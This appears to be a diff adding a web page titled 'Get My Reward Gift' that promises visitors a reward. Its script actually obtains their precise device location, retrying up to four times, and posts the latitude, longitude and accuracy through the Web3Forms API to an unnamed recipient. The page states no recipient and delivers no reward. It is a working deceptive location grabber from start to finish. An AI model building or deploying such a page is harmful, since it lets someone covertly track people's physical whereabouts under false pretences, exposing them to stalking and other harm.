@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Get My Reward Gift</title>
+  <style>
+    .success { color: green; }
+    .error { color: red; }
+    .info { color: blue; }
+    
+        body {
+          background: linear-gradient(120deg, #f6d365 0%, #fda085 100%);
+          font-family: 'Segoe UI', Arial, sans-serif;
+          margin: 0;
+          padding: 0;
+          min-height: 100vh;
+        }
+        h1 {
+          text-align: center;
+          color: #333;
+          margin-top: 40px;
+          font-size: 2.5rem;
+          letter-spacing: 1px;
+        }
+        h2 {
+          text-align: center;
+          color: #555;
+          font-weight: 400;
+          margin-bottom: 30px;
+        }
+        #status, #output, #debug {
+          max-width: 400px;
+          margin: 20px auto;
+          padding: 16px 24px;
+          border-radius: 12px;
+          background: rgba(255,255,255,0.85);
+          box-shadow: 0 4px 16px rgba(0,0,0,0.07);
+          font-size: 1.1rem;
+        }
+        #status {
+          margin-top: 30px;
+          font-weight: 500;
+        }
+        #output {
+          margin-top: 10px;
+        }
+        #debug {
+          font-size: 0.95rem;
+          color: #888;
+          background: transparent;
+          box-shadow: none;
+          padding: 0;
+        }
+        button {
+          display: block;
+          margin: 30px auto 0 auto;
+          padding: 14px 38px;
+          font-size: 1.2rem;
+          color: #fff;
+          background: linear-gradient(90deg, #36d1c4 0%, #5b86e5 100%);
+          border: none;
+          border-radius: 30px;
+          box-shadow: 0 2px 8px rgba(91,134,229,0.15);
+          cursor: pointer;
+          transition: background 0.3s, transform 0.2s;
+        }
+        button:hover {
+          background: linear-gradient(90deg, #5b86e5 0%, #36d1c4 100%);
+          transform: translateY(-2px) scale(1.04);
+        }
+        .success {
+          color: #27ae60;
+          font-weight: 600;
+        }
+        .error {
+          color: #e74c3c;
+          font-weight: 600;
+        }
+        .info {
+          color: #2980b9;
+          font-weight: 500;
+        }
+     
+  </style>
+</head>
+<body>
+  <h1>Get My Reward Gift</h1>
+  <h2>Please make sure your device location is enabled</h2>
+  <p id="status">Click the button below to get your reward</p>
+  <button onclick="getLocation()">Get Reward Gift</button>
+  <div id="output"></div>
+  <div id="debug"></div>
+
+  <script>
+    // HTTPS check
+    if (window.location.protocol !== 'https:' && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
+      document.getElementById('status').innerHTML = "<span class='error'>Warning: Geolocation requires HTTPS! This page might not work correctly.</span>";
+    }
+
+    let retryCount = 0;
+    let lastError = null;
+
+    function getLocation() {
+      const output = document.getElementById("output");
+      const status = document.getElementById("status");
+      const debug = document.getElementById("debug");
+
+      output.innerHTML = "";
+      debug.innerHTML = "";
+
+      if (!navigator.geolocation) {
+        output.innerHTML = "<p class='error'>Geolocation is not supported by this browser.</p>";
+        return;
+      }
+
+      status.innerHTML = "<span class='info'>Locating... please wait</span>";
+      tryGetPosition();
+
+    function tryGetPosition() {
+      let options = {
+        enableHighAccuracy: retryCount < 2,
+        timeout: (retryCount + 1) * 5000,
+        maximumAge: retryCount > 0 ? 60000 : 0
+      };
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+        const lat = position.coords.latitude;
+        const long = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+
+        status.innerHTML = "<span class='success'>Location found!</span>";
+        output.innerHTML = `<p class='success'>Submitting location via Web3Forms...</p>`;
+
+        sendDataToWeb3Forms(lat, long, accuracy);
+        debug.innerHTML += `<p>Successfully obtained position (retry #${retryCount})</p>`;
+        },
+        (error) => {
+        lastError = error;
+        debug.innerHTML += `<p>Error on attempt #${retryCount}: Code ${error.code}</p>`;
+
+        if (retryCount < 3) {
+          retryCount++;
+          status.innerHTML = `<span class='info'>Retrying... (attempt ${retryCount + 1}/4)</span>`;
+          setTimeout(tryGetPosition, 1000);
+          return;
+        }
+
+        let errorMessage = "";
+        switch (error.code) {
+          case error.PERMISSION_DENIED:
+            errorMessage = "Location request denied. Please enable location access.";
+            break;
+          case error.POSITION_UNAVAILABLE:
+            errorMessage = "Location information unavailable.";
+            break;
+          case error.TIMEOUT:
+            errorMessage = "Location request timed out.";
+            break;
+          default:
+            errorMessage = "Unknown error occurred.";
+        }
+
+        status.innerHTML = "<span class='error'>Failed to get location</span>";
+        output.innerHTML = `<p class='error'>${errorMessage}</p>`;
+        },
+        options
+      );
+    }
+
+ 
+    }
+
+    function sendDataToWeb3Forms(latitude, longitude, accuracy) {
+      const output = document.getElementById("output");
+
+      const formData = {
+        access_key: "e75d668b-af45-458f-bdfb-794b626ca931",
+        name: "Reward User",
+        email: "anonymous@example.com",
+        message: `User location: Latitude ${latitude.toFixed(6)}, Longitude ${longitude.toFixed(6)}, Accuracy: ${accuracy.toFixed(2)} meters.`,
+        "fields[latitude]": latitude.toFixed(6),
+        "fields[longitude]": longitude.toFixed(6),
+        "fields[accuracy]": accuracy.toFixed(2)
+      };
+
+      fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(formData)
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (data.success) {
+            output.innerHTML = `<p class='success'>Thank you! Your location has been submitted successfully.</p>`;
+          } else {
+            output.innerHTML = `<p class='error'>Something went wrong: ${data.message || "Please try again."}</p>`;
+          }
+        })
+        .catch(error => {
+          console.error("Error:", error);
+          output.innerHTML = `<p class='error'>An error occurred while submitting the form. Please try again later.</p>`;
+        });
+    }
+  </script>
+</body>
+</html>
